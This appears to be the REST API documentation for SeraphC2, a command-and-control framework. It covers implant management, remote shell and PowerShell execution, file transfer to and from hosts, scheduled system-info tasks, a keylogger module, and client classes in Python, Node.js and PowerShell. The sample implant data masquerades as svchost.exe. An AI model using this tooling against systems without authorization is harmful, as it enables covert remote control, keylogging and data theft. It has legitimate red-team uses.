# SeraphC2 API Documentation

This document provides comprehensive documentation for the SeraphC2 REST API, including authentication, endpoints, request/response formats, and integration examples.

## Table of Contents

1. [API Overview](#api-overview)
2. [Authentication](#authentication)
3. [Rate Limiting](#rate-limiting)
4. [Request/Response Format](#requestresponse-format)
5. [Error Handling](#error-handling)
6. [Core Endpoints](#core-endpoints)
7. [Integration Examples](#integration-examples)
8. [SDKs and Libraries](#sdks-and-libraries)
9. [Webhooks](#webhooks)
10. [Production Considerations](#production-considerations)

## API Overview

The SeraphC2 API is a RESTful API that provides programmatic access to all SeraphC2 functionality. It supports JSON request/response format and uses standard HTTP methods and status codes.

### Base URL

```
Production: https://api.seraphc2.yourdomain.com
Staging: https://staging-api.seraphc2.yourdomain.com
Development: http://localhost:3000/api
```

### API Version

Current API version: `v1`

All API endpoints are prefixed with `/api` (e.g., `/api/auth/login`).

### Supported Formats

- **Request**: JSON, Form Data (for file uploads)
- **Response**: JSON, XML, CSV (for data exports)
- **Content-Type**: `application/json` (default)

## Authentication

SeraphC2 API supports multiple authentication methods:

### 1. JWT Bearer Token (Recommended)

Most common method for web applications and mobile clients.

**Login to get token:**
```http
POST /api/auth/login
Content-Type: application/json

{
  "username": "your_username",
  "password": "your_password",
  "mfaToken": "123456"
}
```

**Response:**
```json
{
  "success": true,
  "data": {
    "operator": {
      "id": "uuid",
      "username": "your_username",
      "role": "administrator",
      "permissions": ["implants:read", "commands:execute"]
    },
    "tokens": {
      "accessToken": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
      "refreshToken": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
      "expiresIn": 3600
    }
  }
}
```

**Using the token:**
```http
GET /api/implants
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

### 2. API Key Authentication

Best for server-to-server integrations and automated scripts.

**Create API Key:**
```http
POST /api/api-keys
Authorization: Bearer your_jwt_token
Content-Type: application/json

{
  "name": "Integration API Key",
  "permissions": ["implants:read", "commands:execute"],
  "expiresAt": "2024-12-31T23:59:59Z"
}
```

**Using API Key:**
```http
GET /api/implants
X-API-Key: your_api_key_here
```

### 3. Basic Authentication

For simple integrations (not recommended for production).

```http
GET /api/implants
Authorization: Basic base64(username:password)
```

### Token Refresh

Access tokens expire after 1 hour. Use refresh token to get new access token:

```http
POST /api/auth/refresh
Content-Type: application/json

{
  "refreshToken": "your_refresh_token"
}
```

## Rate Limiting

API requests are rate limited to prevent abuse:

### Default Limits

- **General API**: 100 requests per 15 minutes per IP
- **Authentication**: 5 attempts per 5 minutes per IP
- **File Upload**: 10 uploads per hour per user
- **Data Export**: 5 exports per hour per user

### Rate Limit Headers

```http
X-RateLimit-Limit: 100
X-RateLimit-Remaining: 95
X-RateLimit-Reset: 1640995200
X-RateLimit-Window: 900
```

### Rate Limit Exceeded

```json
{
  "success": false,
  "error": "Rate limit exceeded",
  "code": "RATE_LIMIT_EXCEEDED",
  "details": {
    "limit": 100,
    "remaining": 0,
    "resetTime": "2023-12-31T15:30:00Z"
  }
}
```

## Request/Response Format

### Request Format

**Standard Request:**
```http
POST /api/commands
Content-Type: application/json
Authorization: Bearer your_token

{
  "implantId": "uuid",
  "type": "shell",
  "payload": "whoami",
  "timeout": 30
}
```

**File Upload:**
```http
POST /api/files/upload
Content-Type: multipart/form-data
Authorization: Bearer your_token

file: (binary data)
implantId: uuid
description: "Configuration file"
```

### Response Format

**Success Response:**
```json
{
  "success": true,
  "message": "Command executed successfully",
  "data": {
    "id": "command-uuid",
    "status": "completed",
    "result": {
      "output": "administrator",
      "exitCode": 0,
      "executionTime": 1250
    }
  },
  "meta": {
    "timestamp": "2023-12-31T12:00:00Z",
    "requestId": "req-uuid"
  }
}
```

**Error Response:**
```json
{
  "success": false,
  "error": "Implant not found",
  "code": "IMPLANT_NOT_FOUND",
  "details": {
    "implantId": "invalid-uuid",
    "availableImplants": 5
  },
  "meta": {
    "timestamp": "2023-12-31T12:00:00Z",
    "requestId": "req-uuid"
  }
}
```

### Pagination

For endpoints that return lists:

```http
GET /api/implants?page=2&limit=50&sort=lastSeen&order=desc
```

**Response:**
```json
{
  "success": true,
  "data": [...],
  "pagination": {
    "page": 2,
    "limit": 50,
    "total": 150,
    "pages": 3,
    "hasNext": true,
    "hasPrev": true
  }
}
```

## Error Handling

### HTTP Status Codes

- `200` - Success
- `201` - Created
- `400` - Bad Request
- `401` - Unauthorized
- `403` - Forbidden
- `404` - Not Found
- `409` - Conflict
- `422` - Validation Error
- `429` - Rate Limited
- `500` - Internal Server Error
- `503` - Service Unavailable

### Error Codes

| Code | Description |
|------|-------------|
| `VALIDATION_ERROR` | Request validation failed |
| `AUTHENTICATION_REQUIRED` | Authentication token required |
| `INVALID_TOKEN` | Token is invalid or expired |
| `INSUFFICIENT_PERMISSIONS` | User lacks required permissions |
| `RESOURCE_NOT_FOUND` | Requested resource not found |
| `RATE_LIMIT_EXCEEDED` | Rate limit exceeded |
| `IMPLANT_OFFLINE` | Target implant is offline |
| `COMMAND_TIMEOUT` | Command execution timed out |
| `FILE_TOO_LARGE` | Uploaded file exceeds size limit |
| `INVALID_FILE_TYPE` | File type not allowed |

## Core Endpoints

### Authentication Endpoints

#### Login
```http
POST /api/auth/login
```

**Request:**
```json
{
  "username": "string",
  "password": "string",
  "mfaToken": "string (optional)"
}
```

#### Logout
```http
POST /api/auth/logout
Authorization: Bearer token
```

#### Get Current User
```http
GET /api/auth/me
Authorization: Bearer token
```

#### Change Password
```http
POST /api/auth/change-password
Authorization: Bearer token
```

**Request:**
```json
{
  "currentPassword": "string",
  "newPassword": "string"
}
```

### Implant Management

#### List Implants
```http
GET /api/implants?status=active&page=1&limit=50
Authorization: Bearer token
```

**Query Parameters:**
- `status`: Filter by status (active, inactive, error)
- `hostname`: Filter by hostname
- `username`: Filter by username
- `os`: Filter by operating system
- `page`: Page number (default: 1)
- `limit`: Items per page (default: 50, max: 100)
- `sort`: Sort field (hostname, lastSeen, status)
- `order`: Sort order (asc, desc)

**Response:**
```json
{
  "success": true,
  "data": [
    {
      "id": "uuid",
      "hostname": "DESKTOP-ABC123",
      "username": "administrator",
      "operatingSystem": "Windows 10 Pro",
      "architecture": "x64",
      "privileges": "admin",
      "lastSeen": "2023-12-31T12:00:00Z",
      "status": "active",
      "communicationProtocol": "https",
      "ipAddress": "192.168.1.100",
      "processId": 1234,
      "parentProcess": "explorer.exe",
      "installPath": "C:\\Windows\\System32\\svchost.exe",
      "version": "1.0.0",
      "capabilities": ["shell", "file", "screen", "keylog"],
      "metadata": {
        "antivirus": "Windows Defender",
        "domain": "WORKGROUP",
        "uptime": 86400
      }
    }
  ],
  "pagination": {
    "page": 1,
    "limit": 50,
    "total": 25,
    "pages": 1
  }
}
```

#### Get Implant Details
```http
GET /api/implants/{implantId}
Authorization: Bearer token
```

#### Update Implant
```http
PUT /api/implants/{implantId}
Authorization: Bearer token
```

**Request:**
```json
{
  "alias": "Production Server",
  "tags": ["production", "web-server"],
  "notes": "Main web server"
}
```

#### Delete Implant
```http
DELETE /api/implants/{implantId}
Authorization: Bearer token
```

### Command Execution

#### Execute Command
```http
POST /api/commands
Authorization: Bearer token
```

**Request:**
```json
{
  "implantId": "uuid",
  "type": "shell|powershell|file|system|module",
  "payload": "command or parameters",
  "timeout": 30,
  "async": false
}
```

**Command Types:**
- `shell`: Execute shell command
- `powershell`: Execute PowerShell command
- `file`: File operations (upload, download, list)
- `system`: System information gathering
- `module`: Execute loaded module

**Response:**
```json
{
  "success": true,
  "data": {
    "id": "command-uuid",
    "implantId": "uuid",
    "type": "shell",
    "payload": "whoami",
    "status": "completed",
    "timestamp": "2023-12-31T12:00:00Z",
    "result": {
      "output": "DESKTOP-ABC123\\administrator",
      "error": "",
      "exitCode": 0,
      "executionTime": 1250
    }
  }
}
```

#### Get Command Status
```http
GET /api/commands/{commandId}
Authorization: Bearer token
```

#### List Commands
```http
GET /api/commands?implantId=uuid&status=completed&page=1&limit=50
Authorization: Bearer token
```

### File Management

#### Upload File to Implant
```http
POST /api/files/upload
Content-Type: multipart/form-data
Authorization: Bearer token

file: (binary data)
implantId: uuid
remotePath: "C:\\temp\\file.txt"
overwrite: true
```

#### Download File from Implant
```http
POST /api/files/download
Authorization: Bearer token
```

**Request:**
```json
{
  "implantId": "uuid",
  "remotePath": "C:\\temp\\file.txt",
  "localName": "downloaded_file.txt"
}
```

#### List Files
```http
GET /api/files?implantId=uuid&path=C:\\temp
Authorization: Bearer token
```

#### Delete File
```http
DELETE /api/files/{fileId}
Authorization: Bearer token
```

### Task Management

#### Create Scheduled Task
```http
POST /api/tasks
Authorization: Bearer token
```

**Request:**
```json
{
  "name": "Daily System Info",
  "description": "Collect system information daily",
  "implantIds": ["uuid1", "uuid2"],
  "command": {
    "type": "system",
    "payload": "systeminfo"
  },
  "schedule": {
    "type": "cron",
    "expression": "0 9 * * *",
    "timezone": "UTC"
  },
  "enabled": true
}
```

#### List Tasks
```http
GET /api/tasks?status=active&page=1&limit=50
Authorization: Bearer token
```

#### Update Task
```http
PUT /api/tasks/{taskId}
Authorization: Bearer token
```

#### Delete Task
```http
DELETE /api/tasks/{taskId}
Authorization: Bearer token
```

### Module Management

#### List Available Modules
```http
GET /api/modules
Authorization: Bearer token
```

#### Load Module on Implant
```http
POST /api/modules/load
Authorization: Bearer token
```

**Request:**
```json
{
  "implantId": "uuid",
  "moduleId": "keylogger",
  "parameters": {
    "duration": 3600,
    "logFile": "C:\\temp\\keylog.txt"
  }
}
```

#### Execute Module Function
```http
POST /api/modules/execute
Authorization: Bearer token
```

**Request:**
```json
{
  "implantId": "uuid",
  "moduleId": "keylogger",
  "function": "start",
  "parameters": {}
}
```

### User Management (Admin Only)

#### List Users
```http
GET /api/users
Authorization: Bearer token
```

#### Create User
```http
POST /api/users
Authorization: Bearer token
```

**Request:**
```json
{
  "username": "newuser",
  "email": "user@example.com",
  "password": "secure_password",
  "role": "operator",
  "permissions": ["implants:read", "commands:execute"]
}
```

#### Update User
```http
PUT /api/users/{userId}
Authorization: Bearer token
```

#### Delete User
```http
DELETE /api/users/{userId}
Authorization: Bearer token
```

### Audit and Logging

#### Get Audit Logs
```http
GET /api/audit?action=login&user=username&from=2023-12-01&to=2023-12-31
Authorization: Bearer token
```

#### Export Audit Logs
```http
POST /api/audit/export
Authorization: Bearer token
```

**Request:**
```json
{
  "format": "csv|json|xml",
  "filters": {
    "actions": ["login", "command_execute"],
    "users": ["user1", "user2"],
    "dateRange": {
      "from": "2023-12-01T00:00:00Z",
      "to": "2023-12-31T23:59:59Z"
    }
  }
}
```

### System Information

#### Health Check
```http
GET /api/health
```

**Response:**
```json
{
  "success": true,
  "data": {
    "status": "healthy",
    "timestamp": "2023-12-31T12:00:00Z",
    "uptime": 86400,
    "version": "1.0.0",
    "checks": {
      "database": "healthy",
      "redis": "healthy",
      "memory": "healthy"
    }
  }
}
```

#### System Metrics
```http
GET /api/health/metrics
Authorization: Bearer token
```

#### System Diagnostics
```http
GET /api/health/diagnostics
Authorization: Bearer token
```

## Integration Examples

### Python Integration

```python
import requests
import json

class SeraphC2Client:
    def __init__(self, base_url, username, password):
        self.base_url = base_url
        self.session = requests.Session()
        self.token = None
        self.login(username, password)
    
    def login(self, username, password):
        """Authenticate and get access token"""
        response = self.session.post(
            f"{self.base_url}/api/auth/login",
            json={"username": username, "password": password}
        )
        response.raise_for_status()
        
        data = response.json()
        self.token = data["data"]["tokens"]["accessToken"]
        self.session.headers.update({
            "Authorization": f"Bearer {self.token}"
        })
    
    def get_implants(self, status=None):
        """Get list of implants"""
        params = {}
        if status:
            params["status"] = status
            
        response = self.session.get(
            f"{self.base_url}/api/implants",
            params=params
        )
        response.raise_for_status()
        return response.json()["data"]
    
    def execute_command(self, implant_id, command_type, payload, timeout=30):
        """Execute command on implant"""
        response = self.session.post(
            f"{self.base_url}/api/commands",
            json={
                "implantId": implant_id,
                "type": command_type,
                "payload": payload,
                "timeout": timeout
            }
        )
        response.raise_for_status()
        return response.json()["data"]
    
    def wait_for_command(self, command_id, max_wait=60):
        """Wait for command completion"""
        import time
        
        start_time = time.time()
        while time.time() - start_time < max_wait:
            response = self.session.get(
                f"{self.base_url}/api/commands/{command_id}"
            )
            response.raise_for_status()
            
            command = response.json()["data"]
            if command["status"] in ["completed", "failed", "timeout"]:
                return command
                
            time.sleep(1)
        
        raise TimeoutError("Command did not complete within timeout")

# Usage example
client = SeraphC2Client("https://api.seraphc2.com", "username", "password")

# Get active implants
implants = client.get_implants(status="active")
print(f"Found {len(implants)} active implants")

# Execute command on first implant
if implants:
    implant = implants[0]
    command = client.execute_command(
        implant["id"], 
        "shell", 
        "whoami"
    )
    
    # Wait for completion
    result = client.wait_for_command(command["id"])
    print(f"Command output: {result['result']['output']}")
```

### JavaScript/Node.js Integration

```javascript
const axios = require('axios');

class SeraphC2Client {
    constructor(baseUrl) {
        this.baseUrl = baseUrl;
        this.client = axios.create({
            baseURL: baseUrl,
            timeout: 30000
        });
        this.token = null;
    }
    
    async login(username, password, mfaToken = null) {
        const response = await this.client.post('/api/auth/login', {
            username,
            password,
            mfaToken
        });
        
        this.token = response.data.data.tokens.accessToken;
        this.client.defaults.headers.common['Authorization'] = `Bearer ${this.token}`;
        
        return response.data.data.operator;
    }
    
    async getImplants(filters = {}) {
        const response = await this.client.get('/api/implants', {
            params: filters
        });
        return response.data.data;
    }
    
    async executeCommand(implantId, type, payload, options = {}) {
        const response = await this.client.post('/api/commands', {
            implantId,
            type,
            payload,
            timeout: options.timeout || 30,
            async: options.async || false
        });
        return response.data.data;
    }
    
    async uploadFile(implantId, filePath, remotePath, options = {}) {
        const FormData = require('form-data');
        const fs = require('fs');
        
        const form = new FormData();
        form.append('file', fs.createReadStream(filePath));
        form.append('implantId', implantId);
        form.append('remotePath', remotePath);
        form.append('overwrite', options.overwrite || false);
        
        const response = await this.client.post('/api/files/upload', form, {
            headers: form.getHeaders()
        });
        return response.data.data;
    }
    
    async createTask(taskConfig) {
        const response = await this.client.post('/api/tasks', taskConfig);
        return response.data.data;
    }
}

// Usage example
async function main() {
    const client = new SeraphC2Client('https://api.seraphc2.com');
    
    try {
        // Login
        const operator = await client.login('username', 'password');
        console.log(`Logged in as: ${operator.username}`);
        
        // Get implants
        const implants = await client.getImplants({ status: 'active' });
        console.log(`Found ${implants.length} active implants`);
        
        // Execute command
        if (implants.length > 0) {
            const command = await client.executeCommand(
                implants[0].id,
                'shell',
                'systeminfo'
            );
            console.log(`Command executed: ${command.id}`);
        }
        
    } catch (error) {
        console.error('Error:', error.response?.data || error.message);
    }
}

main();
```

### PowerShell Integration

```powershell
# SeraphC2 PowerShell Module
class SeraphC2Client {
    [string]$BaseUrl
    [string]$Token
    [hashtable]$Headers
    
    SeraphC2Client([string]$BaseUrl) {
        $this.BaseUrl = $BaseUrl
        $this.Headers = @{
            'Content-Type' = 'application/json'
        }
    }
    
    [hashtable] Login([string]$Username, [string]$Password) {
        $body = @{
            username = $Username
            password = $Password
        } | ConvertTo-Json
        
        $response = Invoke-RestMethod -Uri "$($this.BaseUrl)/api/auth/login" -Method Post -Body $body -Headers $this.Headers
        
        if ($response.success) {
            $this.Token = $response.data.tokens.accessToken
            $this.Headers['Authorization'] = "Bearer $($this.Token)"
            return $response.data.operator
        } else {
            throw "Login failed: $($response.error)"
        }
    }
    
    [array] GetImplants([hashtable]$Filters = @{}) {
        $uri = "$($this.BaseUrl)/api/implants"
        if ($Filters.Count -gt 0) {
            $queryString = ($Filters.GetEnumerator() | ForEach-Object { "$($_.Key)=$($_.Value)" }) -join "&"
            $uri += "?$queryString"
        }
        
        $response = Invoke-RestMethod -Uri $uri -Method Get -Headers $this.Headers
        return $response.data
    }
    
    [hashtable] ExecuteCommand([string]$ImplantId, [string]$Type, [string]$Payload) {
        $body = @{
            implantId = $ImplantId
            type = $Type
            payload = $Payload
            timeout = 30
        } | ConvertTo-Json
        
        $response = Invoke-RestMethod -Uri "$($this.BaseUrl)/api/commands" -Method Post -Body $body -Headers $this.Headers
        return $response.data
    }
}

# Usage example
$client = [SeraphC2Client]::new("https://api.seraphc2.com")

try {
    # Login
    $operator = $client.Login("username", "password")
    Write-Host "Logged in as: $($operator.username)"
    
    # Get implants
    $implants = $client.GetImplants(@{status = "active"})
    Write-Host "Found $($implants.Count) active implants"
    
    # Execute command on each implant
    foreach ($implant in $implants) {
        Write-Host "Executing command on $($implant.hostname)..."
        $command = $client.ExecuteCommand($implant.id, "shell", "whoami")
        Write-Host "Command ID: $($command.id)"
    }
    
} catch {
    Write-Error "Error: $($_.Exception.Message)"
}
```

## Webhooks

SeraphC2 supports webhooks for real-time event notifications.

### Webhook Configuration

```http
POST /api/webhooks
Authorization: Bearer token
```

**Request:**
```json
{
  "name": "Slack Notifications",
  "url": "https://hooks.slack.com/services/...",
  "events": [
    "implant.connected",
    "implant.disconnected",
    "command.executed",
    "alert.triggered"
  ],
  "headers": {
    "Content-Type": "application/json",
    "X-Custom-Header": "value"
  },
  "secret": "webhook_secret_for_verification",
  "retryCount": 3,
  "timeout": 30000
}
```

### Webhook Events

| Event | Description | Payload |
|-------|-------------|---------|
| `implant.connected` | New implant connected | Implant details |
| `implant.disconnected` | Implant disconnected | Implant details |
| `command.executed` | Command completed | Command and result |
| `file.uploaded` | File uploaded to implant | File details |
| `file.downloaded` | File downloaded from implant | File details |
| `operator.login` | Operator logged in | Operator details |
| `alert.triggered` | Security alert triggered | Alert details |

### Webhook Payload Format

```json
{
  "event": "implant.connected",
  "timestamp": "2023-12-31T12:00:00Z",
  "data": {
    "implant": {
      "id": "uuid",
      "hostname": "DESKTOP-ABC123",
      "username": "administrator",
      "operatingSystem": "Windows 10 Pro"
    }
  },
  "metadata": {
    "webhookId": "webhook-uuid",
    "deliveryId": "delivery-uuid",
    "attempt": 1
  }
}
```

### Webhook Verification

Verify webhook authenticity using HMAC-SHA256:

```python
import hmac
import hashlib

def verify_webhook(payload, signature, secret):
    expected_signature = hmac.new(
        secret.encode('utf-8'),
        payload.encode('utf-8'),
        hashlib.sha256
    ).hexdigest()
    
    return hmac.compare_digest(f"sha256={expected_signature}", signature)

# Usage
payload = request.body
signature = request.headers.get('X-SeraphC2-Signature')
secret = 'your_webhook_secret'

if verify_webhook(payload, signature, secret):
    # Process webhook
    pass
else:
    # Invalid signature
    pass
```

## Production Considerations

### Security Best Practices

1. **Use HTTPS**: Always use HTTPS in production
2. **API Keys**: Use API keys for server-to-server communication
3. **Token Expiration**: Implement proper token refresh logic
4. **Rate Limiting**: Respect rate limits and implement backoff
5. **Input Validation**: Validate all input data
6. **Error Handling**: Don't expose sensitive information in errors

### Performance Optimization

1. **Pagination**: Use pagination for large datasets
2. **Filtering**: Apply filters to reduce response size
3. **Caching**: Implement client-side caching where appropriate
4. **Compression**: Enable gzip compression
5. **Connection Pooling**: Reuse HTTP connections

### Monitoring and Logging

1. **Request Logging**: Log all API requests
2. **Error Tracking**: Monitor and track API errors
3. **Performance Metrics**: Track response times and throughput
4. **Health Checks**: Implement health check endpoints
5. **Alerting**: Set up alerts for API failures

### Example Production Configuration

```javascript
// Production API client configuration
const client = axios.create({
  baseURL: 'https://api.seraphc2.com',
  timeout: 30000,
  headers: {
    'User-Agent': 'MyApp/1.0.0',
    'Accept': 'application/json',
    'Content-Type': 'application/json'
  },
  // Enable compression
  decompress: true,
  // Connection pooling
  httpAgent: new http.Agent({ keepAlive: true }),
  httpsAgent: new https.Agent({ keepAlive: true }),
  // Retry configuration
  retry: 3,
  retryDelay: (retryCount) => {
    return Math.pow(2, retryCount) * 1000; // Exponential backoff
  }
});

// Add request/response interceptors
client.interceptors.request.use(
  (config) => {
    console.log(`API Request: ${config.method.toUpperCase()} ${config.url}`);
    return config;
  },
  (error) => {
    console.error('API Request Error:', error);
    return Promise.reject(error);
  }
);

client.interceptors.response.use(
  (response) => {
    console.log(`API Response: ${response.status} ${response.config.url}`);
    return response;
  },
  (error) => {
    console.error('API Response Error:', error.response?.status, error.response?.data);
    
    // Handle token expiration
    if (error.response?.status === 401) {
      // Refresh token logic
      return refreshTokenAndRetry(error.config);
    }
    
    return Promise.reject(error);
  }
);
```

This API documentation provides comprehensive coverage of the SeraphC2 REST API. For additional examples and advanced usage patterns, refer to the SDK documentation and integration guides.